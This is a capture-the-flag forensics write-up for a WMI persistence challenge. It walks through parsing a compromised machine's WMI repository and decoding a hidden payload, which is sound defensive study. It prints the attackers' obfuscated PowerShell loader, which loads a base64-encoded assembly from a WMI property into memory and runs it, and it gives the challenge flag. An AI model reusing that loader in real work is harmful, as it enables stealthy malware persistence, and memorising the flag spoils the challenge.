# Perseverance
> Write-up author: jon-brandy
## DESCRIPTION:
During a recent security assessment of a well-known consulting company, the competent team found some employees' credentials in publicly available breach databases. 
Thus, they called us to trace down the actions performed by these users. During the investigation, it turned out that one of them had been compromised. 
Although their security engineers took the necessary steps to remediate and secure the user and the internal infrastructure, the user was getting compromised repeatedly.
Narrowing down our investigation to find possible persistence mechanisms, we are confident that the malicious actors use WMI to establish persistence.
You are given the WMI repository of the user's workstation. Can you analyze and expose their technique?
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212272170-018e887b-e3e3-4ae6-9969-4311a33a0402.png)


![image](https://user-images.githubusercontent.com/70703371/212272204-e901bf39-fcd0-4c9f-aa0d-afc256689db8.png)


2. Based from the description, we can assume that these files are the WMI repository of a compromised user's workstation.
3. Since it's new for me, so i did a small outsource about WMI and found [this](https://netsecninja.github.io/dfir-notes/wmi-forensics/) website which contains great information about WMI Forensics.

```
C:\Windows\System32\wbem\Repository - Stores the CIM database files
- OBJECTS.DATA - Objects managed by WMI
- INDEX.BTR - Index of files imported into OBJECTS.DATA
- MAPPING[1-3].MAP - correlates data in OBJECTS.DATA and INDEX.BTR

C:\Windows\System32\wbem\AutoRecover - MOF files with #PRAGMA AUTORECOVER in first line will be saved here in case the repo needs to be built again, establishing persistence.
- Review file timestamps
```

4. We should be able to parse the compromised user's WMI repository and extract information about types of commands executed. So i did a small outsource again on the internet and found [this](https://github.com/davidpany/WMI_Forensics) script, let's use it to parse our files.

##### Notes: Can't run the script with python3, run it with python2

```py
python2 PyWMIPersistenceFinder.py ../../../../../Downloads/bin/foren/perse/OBJECTS.DATA
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212274527-3cd98208-30b5-4501-b459-c273f89a344a.png)


![image](https://user-images.githubusercontent.com/70703371/212274564-0acf4ecd-7497-4236-b236-f93336697de6.png)

```
$file = ([WmiClass]'ROOT\cimv2:Win32_MemoryArrayDevice').Properties['Property'].Value;sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null
```

5. Based from the result we know that the WMI consumer name is `Windows Update` and it's running an encoding PowerShell command. Let's decode the encoded text.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212275186-cc65e86e-bfdc-493f-8cb6-3f2cf6dd78b9.png)


6. Hmm i think we need to move all the files to windows then run the first command from the decoded base64 text using poweshell:

```
$file = ([WmiClass]'ROOT\cimv2:Win32_MemoryArrayDevice').Properties['Property'].Value;
```

7. But dunno why my powershell can't identidy the `Get-WmiObject` command, hence i tried to strings the **OBJECT.DATA** file. But we want to filter it with `memoryArray`, it's because we know the decoded command uses `win32_MemoryArrayDevice` in order to access the host's memory.

```
strings OBJECTS.DATA | grep -i memoryarray
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212280631-684a2ef9-fd85-4a6c-9d51-8767b79cd1ed.png)


8. Well i tried to add `-C` and found an encoded base64 strings at `-C5`.

```
strings OBJECTS.DATA | grep -i memoryarray -C5
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212280729-e6726220-a0dc-4055-af8e-f5941e244396.png)


![image](https://user-images.githubusercontent.com/70703371/212280771-1e6862c6-36b5-4a8c-9d9e-47ec3a05f417.png)


9. Now decode the strings using cyberchef.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212281510-6805c262-e619-4137-af41-36be1e97ee62.png)


10. Actually i stucked for a while here, until i add the magic recipe.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212281697-aa6f4521-3606-44c2-b33a-bbf2f4577de8.png)


![image](https://user-images.githubusercontent.com/70703371/212282210-7def5b95-efc1-4e7a-b22a-290d8379a52f.png)


11. When i scrolled down, found this base64 strings.

![image](https://user-images.githubusercontent.com/70703371/212282392-bdaa051a-bcdc-4d55-b5d0-d43b86cba229.png)


12. Let's add `decode text` recipe.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212283373-17a3e443-e03e-4b21-950b-9732387ce6c4.png)


13. Now decode this base64, because it has the HTB prefix.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/212284007-b763cf5b-9dbd-4d2f-b428-48c62c53985a.png)


14. Got the flag!

## FLAG

```
HTB{1_th0ught_WM1_w4s_just_4_M4N4g3m3nt_T00l}
```


## LEARNING REFERENCES:

```
https://netsecninja.github.io/dfir-notes/wmi-forensics/
https://github.com/davidpany/WMI_Forensics
```
